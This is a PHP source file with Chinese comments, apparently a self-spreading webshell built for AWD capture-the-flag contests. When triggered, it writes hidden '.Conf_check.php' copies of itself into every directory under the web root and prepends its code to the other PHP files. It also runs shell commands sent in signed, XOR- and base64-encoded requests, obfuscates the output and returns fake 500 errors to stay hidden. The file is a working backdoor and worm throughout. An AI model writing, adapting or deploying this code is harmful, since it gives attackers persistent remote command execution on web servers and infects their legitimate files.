<?php
$tips = 'AWD_Light_Check';
//这个是后面检查的是否感染头，如果没有，就会重写这个php
error_reporting(0);
$Serv_Num = 159;
//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。
$arr_dir = array();
//全局变量，扫到的文件夹
$files = array();
//全局变量，扫到的文件
if (!function_exists('Url_Check')) {
    function Url_Check()
    {
        $pageURL = 'http';
        if ($_SERVER["HTTPS"] == "on") {
            $pageURL .= "s";
        }
        $pageURL .= '://';
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
        return $pageURL;
    }
    function file_check($dir)
    {
        //扫描文件夹
        global $arr_dir;
        global $files;
        if (is_dir($dir)) {
            if ($handle = opendir($dir)) {
                while (($file = readdir($handle)) !== false) {
                    if ($file != '.' && $file != "..") {
                        if (is_dir($dir . "/" . $file)) {
                            $arr_dir[] = $dir;
                            $files[$file] = file_check($dir . "/" . $file);
                            //拼接文件
                        } else {
                            $arr_dir[] = $dir;
                            $files[] = $dir . "/" . $file;
                        }
                    }
                }
            }
        }
        closedir($handle);
        $arr_dir = array_unique($arr_dir);
        //去重
    }
    function write_conf()
    {
        #每个目录创一个马
        global $Serv_Num;
        global $arr_dir;
        foreach ($arr_dir as $dir_path) {
            // echo '<br>'.$dir_path;
            $srcode = '';
            $localtext = file(__FILE__);
            for ($i = 0; $i < $Serv_Num; $i++) {
                $srcode .= $localtext[$i];
            }
            //所有文件夹都生成一个webshell
            // echo "<span style='color:#666'></span> " . $dir_path . "/.Conf_check.php" . "<br/>";
            $le = Url_Check();
            echo '<iframe id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir_path . "/.Conf_check.php") . '</iframe>';
            fputs(fopen($dir_path . "/.Conf_check.php", "w"), $srcode);
        }
        // 当前目录所有php被感染
    }
    function vul_tran()
    {
        //每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。
        //######
        global $Serv_Num;
        $pdir = dirname(__FILE__);
        //要获取的目录
        //先判断指定的路径是不是一个文件夹
        if (is_dir($pdir)) {
            if ($dh = opendir($pdir)) {
                while (($fi = readdir($dh)) != false) {
                    //文件名的全路径 包含文件名
                    $file_Path = $pdir . '/' . $fi;
                    if (strpos($file_Path, '.php')) {
                        //筛选当前目录.php后缀
                        $le = Url_Check();
                        $file_Path = str_replace('\\', '/', $file_Path);
                        echo '<iframe id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $file_Path) . '</iframe>';
                        $ftarget = file($file_Path);
                        if (!strpos($ftarget[0], 'AWD_Light_Check')) {
                            //检查头部是否传播
                            $scode = '';
                            $localtext = file(__FILE__);
                            for ($i = 0; $i < $Serv_Num; $i++) {
                                $scode .= $localtext[$i];
                            }
                            $code_check = '';
                            $file_check = fopen($file_Path, "r");
                            //复制要传播的文件代码，进行重写
                            while (!feof($file_check)) {
                                $code_check .= fgets($file_check) . "\n";
                            }
                            fclose($file_check);
                            $webpage = fopen($file_Path, "w");
                            fwrite($webpage, $scode . $code_check);
                            fclose($webpage);
                        }
                    }
                }
                closedir($dh);
            }
        }
    }
}
///////////////////////////////////////////////////////////////////////////////////
//主函数
try {
    //定义特征才启动传播模式，特征值为_
    if (isset($_GET['_'])) {
        $host = Url_Check();
        file_check($_SERVER['DOCUMENT_ROOT']);
        //全局扫描
        write_conf();
        //写入单文件
        vul_tran();
        //感染当前目录
    } elseif (isset($_GET['time']) && isset($_GET['salt']) && isset($_GET['sign'])) {
        #客户端数字签名校验
        $Check_key = '9c82746189f3d1815f1e6bfe259dac29';
        $Check_api = $_GET['check'];
        $timestamp = $_GET['time'];
        $salt = $_GET['salt'];
        $csign = $_GET['sign'];
        $sign = md5($Check_api . $Check_key . $timestamp . $salt);
        if ($sign === $csign) {
            $nomal_test = '';
            for ($i = 0; $i < strlen($Check_api); $i++) {
                $nomal_test .= chr(ord($Check_api[$i]) ^ $i % $salt);
            }
            $nomal_test = base64_decode($nomal_test);
            $nowtime = time();
            if (abs($nowtime - $timestamp) <= 5) {
                $enc = base64_encode(rawurlencode(`{$nomal_test}`));
                //解密并执行命令在加密返回
                $pieces = explode("i", $enc);
                $final = "";
                foreach ($pieces as $val) {
                    $final .= $val . "cAFAcABAAswTA2GE2c";
                }
                $final = str_replace("=", ":kcehc_revres", $final);
                echo strrev(substr($final, 0, strlen($final) - 18));
                exit;
            } else {
                header('HTTP/1.1 500 Internal Server Error');
            }
        } else {
            header('HTTP/1.1 500 Internal Server Error');
        }
    } else {
        header('HTTP/1.1 500 Internal Server Error');
    }
} catch (Exception $e2) {
}